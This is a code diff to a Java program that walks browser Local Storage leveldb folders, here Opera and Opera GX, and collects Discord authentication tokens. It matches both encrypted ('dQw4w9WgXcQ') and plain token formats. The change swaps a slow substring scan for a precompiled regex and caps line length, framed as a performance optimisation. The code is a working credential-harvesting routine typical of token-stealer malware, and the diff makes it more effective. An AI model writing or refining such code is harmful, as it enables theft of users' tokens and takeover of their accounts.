@@ -200,6 +200,9 @@ public final class Main {
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera GX Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
 
+        // Pre-compile regex pattern for performance
+        java.util.regex.Pattern tokenPattern = java.util.regex.Pattern.compile("[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,}");
+
         for (File file : paths) {
             if (file == null || !file.exists() || !file.isDirectory()) {
                 continue;
@@ -210,6 +213,11 @@ public final class Main {
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
+                        // Limit line length to avoid performance issues
+                        if (strLine.length() > 50000) {
+                            strLine = strLine.substring(0, 50000);
+                        }
+                        
                         // Check for encrypted Discord token pattern (dQw4w9WgXcQ)
                         int index = strLine.indexOf("dQw4w9WgXcQ");
                         if (index != -1) {
@@ -244,20 +252,16 @@ public final class Main {
                             }
                         }
                         
-                        // Search for regular Discord token patterns using regex-like matching
-                        // Pattern: base64(user_id).base64(timestamp).base64(hmac)
-                        for (int i = 0; i < strLine.length() - 80; i++) {
-                            try {
-                                String substr = strLine.substring(i, Math.min(i + 100, strLine.length()));
-                                // Look for tokens that match the pattern: alphanumeric.alphanumeric.alphanumeric
-                                if (substr.matches("^[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,}.*")) {
-                                    String potentialToken = substr.split("[^A-Za-z0-9._-]")[0];
-                                    if (potentialToken.length() >= 59 && !temp.contains(potentialToken)) {
-                                        temp.add(potentialToken);
-                                    }
+                        // Search for regular Discord token patterns using optimized regex matching
+                        try {
+                            java.util.regex.Matcher matcher = tokenPattern.matcher(strLine);
+                            while (matcher.find()) {
+                                String potentialToken = matcher.group();
+                                if (potentialToken.length() >= 59 && !temp.contains(potentialToken)) {
+                                    temp.add(potentialToken);
                                 }
-                            } catch (Exception ignored) {
                             }
+                        } catch (Exception ignored) {
                         }
                     }
                 } catch (Exception ignored) {
